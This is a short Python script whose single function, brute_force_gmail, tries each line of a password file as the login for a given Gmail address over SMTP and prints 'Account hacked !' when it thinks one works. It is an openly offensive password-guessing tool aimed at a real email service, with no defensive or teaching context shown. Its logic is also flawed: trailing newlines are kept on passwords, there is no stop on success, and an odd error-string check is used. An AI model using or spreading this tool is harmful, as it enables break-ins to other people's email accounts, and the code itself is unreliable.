from logging import error
import smtplib
from os import system


    

def brute_force_gmail(email, passwords_file):
    i = 0
    server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
    server.ehlo()
    with open(passwords_file) as passwords:
        for password in passwords:
            i += 1
            try:
                print("Trying with password : "+password+"\n")
                server.login(email,password)
                print('\n')
                print('Account hacked ! , password : '+password)
            except smtplib.SMTPAuthenticationError as e:
                error = str(e)
                if error[14] == '<':
                    print('Account hacked ! , password : '+password)
                else:
                    print('password not found')
        